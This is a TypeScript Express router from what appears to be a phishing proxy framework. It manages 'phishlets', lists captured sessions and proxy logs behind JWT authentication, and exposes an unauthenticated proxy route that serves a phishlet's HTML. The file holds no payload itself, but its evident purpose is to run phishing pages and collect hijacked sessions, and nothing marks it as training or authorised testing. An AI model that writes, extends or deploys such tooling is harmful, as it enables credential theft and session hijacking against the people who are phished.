import { Router, Request, Response } from 'express';
import { asyncHandler, createApiResponse } from '../middleware/validation';
import { phishletService } from '../services/phishletService';
import { proxyService } from '../services/proxyService';
import { AppDataSource } from '../data-source';
import { CapturedSession, ProxyLog } from '../entities';
import { authenticateJWT } from '../middleware/auth';

const router = Router();

// Apply authentication to all routes except the proxy
router.use('/phishlets', authenticateJWT);
router.use('/sessions', authenticateJWT);
router.use('/logs', authenticateJWT);

// Phishlet management
router.post('/phishlets', asyncHandler(async (req: Request, res: Response) => {
    const phishlet = await phishletService.create(req.body);
    res.json(createApiResponse(true, phishlet));
}));

router.get('/phishlets', asyncHandler(async (_req: Request, res: Response) => {
    const phishlets = await phishletService.findAll();
    res.json(createApiResponse(true, phishlets));
}));

router.get('/phishlets/:id', asyncHandler(async (req: Request, res: Response) => {
    const phishlet = await phishletService.findById(req.params.id);
    res.json(createApiResponse(true, phishlet));
}));

router.put('/phishlets/:id', asyncHandler(async (req: Request, res: Response) => {
    const phishlet = await phishletService.update(req.params.id, req.body);
    res.json(createApiResponse(true, phishlet));
}));

router.delete('/phishlets/:id', asyncHandler(async (req: Request, res: Response) => {
    const success = await phishletService.delete(req.params.id);
    res.json(createApiResponse(success));
}));

// Captured sessions and logs
router.get('/sessions', asyncHandler(async (_req: Request, res: Response) => {
    const sessionRepo = AppDataSource.getRepository(CapturedSession);
    const sessions = await sessionRepo.find();
    res.json(createApiResponse(true, sessions));
}));

router.get('/logs/:sessionId', asyncHandler(async (req: Request, res: Response) => {
    const logRepo = AppDataSource.getRepository(ProxyLog);
    const logs = await logRepo.find({ where: { sessionId: req.params.sessionId } });
    res.json(createApiResponse(true, logs));
}));

// Proxy
router.get('/proxy/:phishletName', asyncHandler(async (req: Request, res: Response) => {
    const phishlet = await phishletService.findAll().then(phishlets => phishlets.find(p => p.name === req.params.phishletName));
    if (!phishlet) {
        return res.status(404).json(createApiResponse(false, null, 'Phishlet not found'));
    }
    const html = await proxyService.handleRequest(phishlet);
    res.send(html);
}));

export default router;
